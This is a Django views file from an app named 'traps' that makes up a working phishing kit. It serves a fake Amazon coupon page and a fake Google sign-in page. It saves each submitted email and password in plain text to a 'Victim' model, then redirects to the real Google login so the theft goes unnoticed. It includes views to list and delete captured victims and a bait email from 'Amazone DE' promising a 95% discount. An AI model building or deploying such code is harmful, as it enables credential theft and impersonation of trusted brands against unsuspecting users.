from django.shortcuts import render, redirect
from django.core.mail import send_mail
from django.urls import reverse_lazy

from traps.models import Victim
from django.views.generic import ListView, DeleteView


def amazon_offer_show(request):
    return render(request, "traps/amazon/Amazon DE Coupons 50_ Off October 2023 Promo Codes.htm")


def homeView(request):
    return render(request, "traps/home.html")


# Create your views here.


subject = 'PROMOCODE'
message = (
    f"Dear valued customer,\n\n"
    f"We are thrilled to inform you that your exclusive promo code has just landed in your inbox! "
    f"You can now enjoy a spectacular 95% discount on any item you purchase within the given timeframe. "
    f"Your unique promo code is: Q0FK52LM28MY3.\n\n"
    f"We wanted to extend our heartfelt congratulations on unlocking this fantastic opportunity. "
    f"Don't miss out on this chance to grab your favorites at an incredible price!\n\n"
    f"At Amazone DE, we are always here for you, making your shopping experience with us unforgettable.\n\n"
    f"Thank you for choosing us.\n\n"
    f"Warm regards, \n\n"
    f"Your Amazone team"
)
sender_email = 'sackoibrahimakhalil@gmail.com'  # L'adresse e-mail de l'expéditeur


def google_show(request):
    if request.method == "POST":
        email = request.POST.get('identifier')
        password = request.POST.get('password')
        trap = Victim(email=email, password=password)
        trap.save()

        """   send_mail(
            subject,
            message,
            sender_email,
            [email],  # Liste des destinataires (ici, l'email récupéré)
            fail_silently=False,
        ) """
        return redirect('https://accounts.google.com/InteractiveLogin/signinchooser?continue=https%3A%2F%2Fwww.google.com%2F&ec=GAZAmgQ&hl=tr&passive=true&ifkv=AVQVeyzlnmLJTmZibmoikdTTu_5Erw5RP_4BV2m08eph1vOJMAeSiGq3a61-pqTUpwHfjZiV0zkq-A&theme=glif&flowName=GlifWebSignIn&flowEntry=ServiceLogin')

    else:
        return render(request, 'traps/goog/backup.html')

class ListTrapShow(ListView):
    model = Victim
    context_object_name = "victims"

class DeleteElement(DeleteView):
    model = Victim
    context_object_name = "victim"
    #template_name = 'victim_confirm_delete.html'
    slug_field = 'slug'  # Utilise le champ slug comme référence pour extraire l'objet
    slug_url_kwarg = 'email_slug'  # Utilise le slug dans l'URL avec le nom 'email_slug'
    success_url = reverse_lazy("traps:home")